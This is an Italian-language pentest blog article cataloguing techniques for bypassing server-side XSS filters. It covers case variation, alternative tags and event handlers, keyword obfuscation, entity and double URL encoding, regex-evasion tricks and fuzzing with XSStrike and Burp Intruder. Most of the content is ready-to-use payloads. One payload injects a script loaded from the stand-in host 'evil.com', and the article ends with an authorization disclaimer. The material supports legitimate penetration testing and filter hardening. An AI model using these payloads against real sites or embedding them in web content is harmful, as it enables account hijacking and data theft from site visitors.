---
title: 'XSS Filter Bypass: payload e tecniche per superare filtri server-side'
slug: xss-filter-bypass
description: 'Guida pratica ai bypass XSS: tag alternativi, keyword obfuscation, encoding, regex bypass, contesti HTML e JavaScript e tecniche reali per superare filtri server-side.'
image: /xss-filter-bypass.webp
draft: true
date: 2026-03-28T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - xss
  - payload-obfuscation
---

# XSS Filter Bypass: Tecniche per Eludere Filtri Server-Side

I filtri XSS sono l'ostacolo che separa un tester mediocre da uno efficace. Ogni applicazione implementa le proprie regole di sanitizzazione — spesso in modo incompleto, inconsistente o bypassabile con approcci minimali.

Questa guida cataloga le tecniche di bypass più efficaci per i filtri server-side più comuni. Non basta conoscere un payload: devi capire **perché** il filtro non lo blocca.

→ Torna alla guida principale: [XSS Completo](https://hackita.it/articoli/xss)\
→ Per bypass specifici dei WAF commerciali: [XSS WAF Bypass](https://hackita.it/articoli/xss-waf-bypass)

***

## Metodologia: Come Analizzare un Filtro

Prima di tentare bypass casuali, devi capire cosa fa esattamente il filtro. Approccio sistematico:

### Step 1 — Individua cosa viene bloccato

Inietta singoli caratteri e osserva cosa passa:

```
<        →  Viene encodato in &lt; ?
>        →  Viene encodato in &gt; ?
"        →  Viene encodato in &quot; ?
'        →  Viene encodato in &#x27; ?
(        →  Viene rimosso / encodato?
script   →  Viene rimosso?
alert    →  Viene rimosso?
on*      →  Onload, onerror, etc. vengono rimossi?
```

### Step 2 — Identifica il tipo di filtro

* **Blocklist di parole chiave**: rimuove o sostituisce stringhe specifiche
* **HTML entity encoding**: converte caratteri speciali in entità HTML
* **Strip di tag**: rimuove qualsiasi tag HTML
* **WAF commerciale**: regole complesse, pattern matching

Ogni tipo ha debolezze diverse.

### Step 3 — Testa in modo sistematico

Non sparare tutti i bypass a caso. Testa una variante alla volta, osserva cosa cambia nella response.

***

## Bypass per Tag Bloccati

### `<script>` Bloccato

```javascript
// Case variation (molti filtri case-sensitive)
<Script>alert(1)</Script>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

// Tag alternativi con event handler
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<iframe onload=alert(1)>

// JavaScript URI
<a href="javascript:alert(1)">click</a>

// SVG avanzato
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=y>
```

### `<img>` Bloccato

```javascript
<svg/onload=alert(1)>
<video><source onerror=alert(1)>
<math><mi//xlink:href=javascript:alert(1)>
<table><td background=javascript:alert(1)>   // IE legacy
<object data=javascript:alert(1)>
```

### Tutti i tag HTML bloccati

Se il filtro strip qualsiasi `<tag>`, potresti essere in un context JavaScript dove non servono tag:

```javascript
// Se sei dentro <script>var x = 'INPUT';</script>
'; alert(1); //

// Se sei dentro un event handler onclick="func('INPUT')"
'); alert(1); //
```

***

## Bypass per Keyword Bloccate

### `alert` Bloccato

```javascript
// Funzioni alternative per PoC
confirm(1)
prompt(1)
console.log(document.domain)

// Costruzione della stringa
window['al'+'ert'](1)
this['al'+'ert'](1)
window[atob('YWxlcnQ=')](1)    // Base64 di "alert"

// CharCode
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Riferimento indiretto
[].constructor.constructor('alert(1)')()
```

### `script` Bloccato come Keyword

```javascript
// La parola "script" non deve essere letterale
<img src=x onerror=alert(1)>    // Non usa "script"

// Se devi iniettare src che punta a .js
<img src=x onerror="var s=document.createElement('s'+'cript');s.src='//evil.com/x.js';document.body.appendChild(s)">
```

### `onerror` / `onload` Bloccati

```javascript
// Altri event handler
onfocus + autofocus
onmouseover
onmouseenter
onpointerover
onpointerenter
ontoggle (con <details open>)
onanimationstart
onanimationend
ontransitionend
```

### `javascript:` Bloccato

```javascript
// Encoding
&#106;avascript:alert(1)
j&#97;vascript:alert(1)
java&#x73;cript:alert(1)
java\u0073cript:alert(1)

// Case variation
JavaScript:alert(1)
JAVASCRIPT:alert(1)

// Whitespace prima del protocollo
    javascript:alert(1)     // Spazio iniziale
%0Ajavascript:alert(1)      // Newline
%09javascript:alert(1)      // Tab
```

***

## Bypass per Caratteri Bloccati

### Parentesi `()` Bloccate

```javascript
// Template literals
alert`1`
alert`document.domain`

// throw trick
<svg/onload="window.onerror=alert;throw 1">
onerror=alert;throw 1

// Costruzione indiretta
[1].find(alert)
```

### Virgolette `"` e `'` Bloccate

```javascript
// Backtick
<img src=x onerror=alert`1`>

// Senza quotes negli attributi (se il valore non ha spazi)
<img src=x onerror=alert(1)>

// CharCode per costruire stringhe
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
```

### Spazi Bloccati

```javascript
// Slash
<img/src=x/onerror=alert(1)>

// Tab (0x09)
<img	src=x	onerror=alert(1)>
<img%09src=x%09onerror=alert(1)>

// Newline
<img%0Asrc=x%0Aonerror=alert(1)>

// Null byte (alcune implementazioni)
<img%00src=x%00onerror=alert(1)>

// Commento CSS (dentro style)
<div style="color:red/**/;xss:expression(alert(1))">   // IE
```

### Punto e virgola `;` Bloccato

```javascript
// In JavaScript, newline termina statement
<script>
alert(1)
</script>

// Operatori logici come separatori
<script>alert(1)&&alert(2)</script>
<img src=x onerror="alert(1),alert(2)">
```

***

## Bypass Encoding

### Double URL Encoding

Un filtro che fa URL decode una volta non cattura double-encoded payload:

```
%253Cscript%253E  
  → dopo primo decode → %3Cscript%3E  
  → dopo secondo decode → <script>
```

Funziona quando l'applicazione fa double decode (raro ma esistente).

### HTML Entity Encoding

Alcuni contesti (href, event handler inline) decodificano HTML entities prima di processare:

```html
<!-- href decodifica entities -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>

<!-- Hex entities -->
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>
```

### Unicode Escape nelle Stringhe JS

Dentro un context JavaScript già aperto:

```javascript
// Dentro <script>var x = 'INPUT';</script>
\u0027; alert(1); //   // \u0027 = '

// In attributo JS
\x27; alert(1); //     // \x27 = '
```

***

## Bypass di Filtri Regex Specifici

### Filtro: rimuove `on` seguito da lettere

```javascript
// Separa con caratteri non-alpha che alcuni regex ignorano
<img src=x on%0Aerror=alert(1)>    // Newline tra "on" e "error"
<img src=x on	error=alert(1)>      // Tab
```

### Filtro: rimuove `<script>` ma non ricorsivamente

```javascript
// Se il filtro fa solo una pass di sostituzione
<scr<script>ipt>alert(1)</scr</script>ipt>
// Dopo rimozione di <script>: <script>alert(1)</script>
```

### Filtro: controlla solo l'inizio del tag

```javascript
// Aggiunta di attributi prima dell'event handler
<img aaa="bbb" src=x onerror=alert(1)>
<img zzz src=x onerror=alert(1)>
```

***

## Contesti Speciali

### CSS Expression (solo IE, legacy)

```html
<div style="color:expression(alert(1))">
<style>*{color:expression(alert(1))}</style>
```

### SVG con JavaScript

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<svg><a><animate attributeName=href values=javascript:alert(1) /><text>click</text></a></svg>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
```

### Data URI

```html
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
```

***

## Tool: Fuzzing Automatico dei Filtri

### XSStrike — Analisi Context-Aware

```bash
python3 xsstrike.py -u "http://target.com/page?param=test" \
    --fuzzer    # Attiva fuzzing aggressivo
```

XSStrike analizza la response e genera payload specifici per il filtro rilevato.

### Intruder di Burp Suite

1. Intercetta la richiesta
2. Invia a Intruder
3. Segna il parametro vulnerabile come posizione
4. Usa payload list da [XSS Payload List](https://hackita.it/articoli/xss-payload-list)
5. Analizza le response per lunghezza anomala (filtro che rimuove) o contenuto (reflection)

***

## Checklist Bypass — Cheat Sheet Rapido

```
☐ Tag alternativi a <script>: img, svg, video, audio, details, body
☐ Case variation: <ScRiPt>, <IMG>, <SVG>
☐ Encoding attributi: %09, %0A, %0D, /**/, null byte
☐ Alert alternatives: confirm, prompt, window['al'+'ert']
☐ No parentesi: alert`1`, throw trick
☐ No quotes: backtick, no-quote attribute values
☐ No spazi: /src=x/onerror=, tab, newline
☐ Encoding: HTML entities, unicode \u, hex \x
☐ Double encoding: %253C
☐ Context-specific: JS string break, event handler injection
```

***

###### *Disclaimer: Usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato penale (art. 615-ter c.p.).*

Vuoi migliorare davvero le tue competenze offensive con un percorso **1:1**? Vai su [HackIta Formazione](https://hackita.it/servizi).
Se invece vuoi testare la sicurezza della tua azienda con un assessment professionale, trovi tutto su [HackIta Servizi](https://hackita.it/servizi).
Se questo contenuto ti è stato utile e vuoi supportare il progetto, puoi farlo su [HackIta Supporto](https://hackita.it/supporto).
Per un approfondimento esterno lato difesa, utile anche la [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

(\[1]): [https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html?utm_source=chatgpt.com) "Cross Site Scripting Prevention - OWASP Cheat Sheet Series"
